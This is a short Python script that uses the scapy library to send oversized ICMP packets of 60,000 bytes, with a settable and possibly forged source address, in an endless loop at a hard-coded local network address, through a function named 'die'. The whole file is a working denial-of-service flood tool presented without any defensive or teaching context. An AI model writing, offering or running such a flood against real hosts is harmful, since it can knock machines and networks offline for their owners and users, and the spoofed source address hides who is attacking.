from scapy.all import *
from scapy.layers.inet import IP, ICMP


def die(source, target, amount, interface):
    p = IP(src=source, dst=target)/ICMP()/("P"*60000)
    if amount == -1:
        print("Sending packets in loop...")
        while True:
            send(p * 1000, verbose=False, iface=interface)
    print("Sending {} packets...".format(amount))
    send(p * amount, verbose=False, iface=interface)


def main():
    # print(ifaces)
    target = "192.168.0.228"
    source = "192.168.0.107"
    amount = -1
    interface = "enp3s0"
    die(source, target, amount, interface)


if __name__ == "__main__":
    main()
